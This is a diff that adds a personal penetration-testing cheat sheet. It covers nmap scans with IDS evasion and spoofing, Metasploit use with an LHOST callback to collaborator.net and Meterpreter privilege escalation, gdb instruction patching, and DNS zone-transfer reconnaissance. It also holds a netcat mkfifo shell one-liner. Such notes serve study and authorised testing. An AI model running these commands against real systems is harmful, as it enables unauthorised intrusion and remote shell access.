@@ -1,0 +1,140 @@
+*Manuals*
+
+recon ng
+    > show modules
+    > use recon/domains-vulnerabilities/xssed
+    > set source google.com
+    > run
+
+nmap
+    Scan Techniques
+        sT tcp connect
+        sY SCTP init scan, scans new protocol STCP that combines UDP and TCP
+        sA tcp ACK, open and closed ports will return RST, if firewall no reply sO IP protocol scan.
+        -sS TCP SYN scan
+        -sT Connect scan
+        -sA ACK scan
+        -sW Window scan
+        -sM Maimon scan
+        -sU UDP Scan
+        -sN TCP Null scan
+
+    Port Specification and Scan Order
+        -p Specify ports, e.g. -p80,443 or -p1-65535
+        -p U:PORT Scan UDP ports with Nmap, e.g. -p U:53
+        -F Fast mode, scans fewer ports than the default scan
+
+    Service Version Detection
+        -sV Probe open ports to determine service/version info
+
+    OS Detection
+        -O Enable OS Detection
+
+    Timing and Performance
+        -T 0-5 Set timing template - higher is faster (less accurate)
+
+    Firewalls IDS Evasion and Spoofing
+        -f; --mtu VALUE Fragment packets (optionally w/given MTU)
+        -D decoy1,decoy2,ME Cloak a scan with decoys
+        -S IP-ADDRESS Spoof source address
+        -e IFACE Use specified interface
+        --badsum Send packets with a bogus TCP/UDP/SCTP checksum
+
+    Misc Nmap Options
+        -A Enable OS detection, version detection, script scanning, and traceroute
+
+Metaslpoit
+
+    MSFconsole
+        $ msfconsole # Entry point for the framework
+        > help
+
+        > show exploits # against known vulnerabilities
+
+        > show auxiliary # modules available (DoS tools, port scanning, fuzzers..)
+
+        > show payloads
+
+        > show options
+        > show targets
+
+        > use payload/bla
+        > set RHOST 192..
+        > run
+
+        if you need the server to make a callback to you:
+
+        set LHOST collaborator.net
+
+        > meterpeter  # is the shell you get when you find RCE in a host.
+        > screenshot
+        > sysinfo # operating system version etc
+        > use priv # tries to elevate privileges
+        >
+
+    MSFcli
+        $ mscli # non interactive client.
+
+Wireshark
+    tcp.port == 21
+
+nc
+    shell
+        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 1234 > /tmp/f
+
+gdb
+    disas main or disassemble main
+    b *0x00000000004008e2 # sets a breakpoint to a pos of memory
+    r or run # runs the program
+    x/s $esi # prints esi registers
+    x/s $rax # prints rax registers
+    info registers # prints all registers
+
+    set  *(char*)0x0000000000400749=0x75 # changes instruction of this pos to jne
+    set  *(char*)0x0000000000400749=0x74 # changes instruction of this pos to je
+
+    list win # shows line of win
+
+    bt # shows call stack
+
+    info locals # info about local variables
+
+    run # runs the app
+
+    b main # adds breakpoint in main
+
+    r # continues execution
+
+    disable 1 # disables break point
+
+    info frame # prints info about addrs
+
+    info functions # all functions
+
+filter your ssh traffic
+    $ tcpdump -lt -i eth0 not \( host my.src.address and tcp port 22 \)
+
+
+Information gathering
+
+    Passive
+        $ whois domain # finds the domain names for a host.
+        $ nslookup domain # find the IP and authoritative servers.
+        $host -t ns google.com # Finds missconfigure DNS entries.
+
+        The Harvester: finds subdomains/email addresses
+            $ python theHarvester.py  -l 500 -b all -d canon.co.uk
+        $dig @dns-host dns-host axfr # check if transfer zone enabled
+    Active
+        nmap
+
+
+
+Cisco password:
+    enable secret 5 $1$mERr$Q4J3cxRImm68KXqMDsLDs/
+        $1 #hash type (1 md5), (5 sha256)
+        mERr base 64 salt
+        Q4J3cxRImm68KXqMDsLDs hashed salt + pass
+
+Replace contents of files
+    $ find . -name watchdog.sh -exec sed -r -e 's/(^.*)-t 10 -i/-t 9 -i/g' {} \; # replace file contents
